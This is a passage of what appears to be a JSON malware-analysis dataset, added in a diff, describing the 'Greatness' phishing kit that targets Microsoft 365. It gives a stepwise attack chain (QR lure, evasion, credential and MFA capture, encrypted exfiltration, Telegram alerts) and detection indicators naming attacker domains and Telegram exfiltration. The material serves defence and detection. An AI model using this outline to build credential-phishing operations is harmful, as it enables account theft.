+                  "why_malicious": "Greatness is a Phishing-as-a-Service toolkit explicitly designed to facilitate credential theft by mimicking Microsoft 365 login pages, intercepting multi-factor authentication (MFA) codes, and employing advanced evasion techniques such as JavaScript obfuscation, anti-bot logic, dynamic content loading, and encrypted exfiltration. Its sole purpose is to enable unauthorized access to Microsoft 365 accounts by stealing user credentials and session data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim receives a phishing email or PDF containing a QR code that directs them to a malicious login page designed to mimic Microsoft 365.",
+                    "implemented_by": [],
+                    "leads_to": "Victim visits the phishing site."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Phishing site loads obfuscated and dynamically loaded JavaScript, implements anti-bot and CAPTCHA evasion to avoid automated detection.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Victim is presented with a fake Microsoft 365 login page."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Victim enters credentials and MFA code into the fake login form, which captures and prepares the data for exfiltration.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credentials and MFA code are captured by the phishing kit."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Captured credentials and MFA code are encrypted, packaged with a JWT, and exfiltrated to the attacker's server using AJAX POST requests.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives credentials and session data."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attacker is notified via Telegram bot of new stolen credentials, enabling rapid exploitation.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker uses credentials and session cookie to access the victim's Microsoft 365 account."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Phishing pages that closely mimic Microsoft 365 login, capturing both credentials and MFA codes",
+                    "Obfuscated JavaScript with dynamic loading of additional code from non-standard or attacker-controlled domains",
+                    "Use of CAPTCHA and custom anti-bot logic to evade automated security analysis and sandboxes",
+                    "AJAX POST requests containing encrypted payloads (e.g., AES-encrypted JSON) sent to unknown or non-Microsoft endpoints after credential input",
+                    "Outbound HTTP requests to the Telegram Bot API (api.telegram.org) containing credential data for attacker notification"
+                  ],
+                  "file_indicators": [
+                    "HTML attachments or web pages with Microsoft 365 branding but source code or form actions pointing to non-Microsoft domains",
+                    "PDF documents containing QR codes that resolve to suspicious or non-Microsoft URLs",
+                    "JavaScript files or inline scripts with heavy obfuscation, Base64-encoded strings, or dynamic script loading from unfamiliar domains"
+                  ],
+                  "network_indicators": [
+                    "AJAX or fetch requests to attacker-controlled domains (e.g., attacker.com, cdn.attacker.com) not associated with Microsoft",
+                    "Outbound connections to api.telegram.org with embedded bot tokens and chat IDs",
+                    "Dynamic script loading from domains not associated with trusted CDNs or Microsoft infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for phishing emails or PDF attachments containing QR codes that direct users to non-Microsoft login pages. Analyze web traffic for AJAX POST requests with encrypted payloads (such as AES-encrypted JSON) to unknown or suspicious domains, especially following credential or MFA input. Flag any use of the Telegram Bot API for outbound notifications from web pages, particularly when containing credential data. Detect obfuscated JavaScript and dynamic script loading from non-standard or attacker-controlled sources. Employ sandboxing and behavioral analysis to identify anti-bot and CAPTCHA evasion logic, and correlate with file and network indicators for comprehensive detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
